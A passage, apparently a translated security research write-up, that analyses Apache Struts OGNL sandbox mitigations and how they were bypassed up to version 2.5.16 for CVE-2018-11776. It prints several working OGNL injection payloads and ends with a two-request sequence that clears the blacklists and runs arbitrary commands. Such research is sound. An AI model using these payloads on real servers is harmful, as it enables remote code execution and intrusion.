这个实例方法试图创建一个OgnlUtil实例，但是因为它是一个单例模式。它返回一个存在的全局对象实例。  
看看在全局对象OgnlUtil中[excludedClasses](https://github.com/apache/struts/blob/STRUTS_2_5_10/core/src/main/java/com/opensymphony/xwork2/ognl/OgnlUtil.java#L60)
是怎么被关联到 _memberAccess对象的，让我们看看_memberAccess怎样被初始化的。  
当请求到来的时候，一个ActionContext对象被createActionContext方法创建。  
最后，OgnlValueStack 的setOgnlUtil函数被调用，以用来初始化OgnlValueStack 的securityMemberAccess
，这样就获得OgnlUtil的全局实例  
我们从下面的图看到，securityMemberAccess（在最后一行）和_memberAccess（第一行）是一样的。  
这就意味着全局OgnlUtil 实例都共享相同的SET：excludedClasses, excludedPackageNames 和
excludedPackageNamePatterns作为_memberAccess，所以清除这些之后也会清除与_memberAccess相匹配的SET。  
在那之后，OGNL 就可以自由的访问DEFAULT_MEMBER_ACCESS对象并且
[OgnlContext](https://github.com/jkuhnert/ognl/blob/OGNL_3_1_15/src/java/ognl/OgnlContext.java)
的
[setMemberAccess](https://github.com/jkuhnert/ognl/blob/OGNL_3_1_15/src/java/ognl/OgnlContext.java#L183)
代替了 _memberAccess和DEFAULT_MEMBER_ACCESS，这样就可以执行任意代码了  
# 绕过2.5.16
我将解释怎样绕过2.5.16中的限制和
CVE-2018-11776。让我们看看官方披露漏洞两天之后公开的一个exp。这是一个不同的版本，但他们大致是这样的：
    ${(#_memberAccess['allowStaticMethodAccess']=true).(#cmd='xcalc').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
看过上一节的读者应该能够发现至少两个原因，为什么这个exp不能工作在2.5.16，并且确定这个exp在哪个版本中不能用（小提示：2.5.x的一个版本），这个实际上是一个好消息，让人们有足够的时间升级自己的服务器并且也希望能防止大规模的攻击发生。
现在让我们构建一个实际可行的exp
我们已经了解了OGNL的缓解措施，自然是利用最新的那个漏洞，就像下面那样：
    (#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.excludedClasses.clear()).(#ognlUtil.excludedPackageNames.clear()).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('xcalc'))
但是在2.5.16这个版本中却不能成功，原因是厂商添加了很多其他的限制。首先，在 2.5.13 中context被移除，还有 excludedClasses
也是一样。在2.5.10之后，黑名单变成了[immutable](https://github.com/apache/struts/commit/748da3f8ce6b9f3953bc418745c35a534e5b98ca)
解释一下，在 2.5.13这个版之后，context 这个全局变量就不能再使用了，所以第一步是寻找context的替代方案。让我们看看有哪些是可用的（
）。我会按照字母表的顺一个个去尝试，让我们看看attr。  
在struts的值中，valueStack 脱颖而出，OgnlValueStack 是它的类型。如果我想回到OGNL使用 context
map，那么OgnlValueStack 这个类型似乎是一个很好的候选者。的确，有一些方法可用调用
[getContext](https://github.com/apache/struts/blob/STRUTS_2_5_16/core/src/main/java/com/opensymphony/xwork2/ognl/OgnlValueStack.java#L117)
，结果它确实按照我们的想法给了我们一个 context map，所以我们修改前面的exp：
    (#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.excludedClasses.clear()).(#ognlUtil.excludedPackageNames.clear()).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('xcalc'))
但，这个exp还是不能运行，因为excludedClasses 和excludedPackageNames是不可改变的：  
不幸的是，黑名单不是一成不变的，因为你可以通过
[setters](https://github.com/apache/struts/blob/STRUTS_2_5_16/core/src/main/java/com/opensymphony/xwork2/ognl/OgnlUtil.java#L98)
改变。
    (#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames('')).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('xcalc'))
可是，这个exp还是不行，因为ognlUtil中excludedClasses这个set被清除了。  
但是_memberAccess中没有被清除
这是因为当在ognlUtil中设置excludedClasses，它会分配excludedClasses
到一个空的集合而不是通过_memberAccess和ognlUtil去修改集合的引用。所以这个改变仅仅影响了ognlUtil，而没有影响_memberAccess。这样，我们现在重新发送我们的payload：  
这是怎么回事？记住，_memberAccess 是一个短暂的对象，当每个请求到来的时候ActionContext
会创建这个对象。每次新的ActionContext
会被[createActionContext](https://github.com/apache/struts/blob/STRUTS_2_5_16/core/src/main/java/org/apache/struts2/dispatcher/filter/StrutsPrepareAndExecuteFilter.java#L132)方法创建，
[setOgnlUtil](https://github.com/apache/struts/blob/STRUTS_2_5_16/core/src/main/java/com/opensymphony/xwork2/ognl/OgnlValueStack.java#L85)方法被调用，目的是用excludedClasses,
excludedPackageNames去创建_memberAccess。黑名单来自全局的ognlUtil。所以，通过重新发送请求，新创建的_memberAccess将清空其黑名单中类和包，这样就允许我们执行我们的代码。整理这些payload，我最后得到两个payloads，第一个是清空excludedClasses
和 excludedPackageNames的黑名单。
    (#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))
第二个是解除_memberAccess并且执行任意代码
    (#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('xcalc'))
一个接一个的发送这些payload，可以让我通过CVE-2018-11776执行任意代码。
感谢 [Kevin
Backhouse](https://twitter.com/kevin_backhouse),这里提供了一个完全可用的CVE-2018-11776的[poc](https://github.com/Semmle/SecurityExploits)，最高可攻击2.5.16这个版本。并且从头构建了一个dockers镜像，目的是搞清楚exp起作用的版本到底是哪个。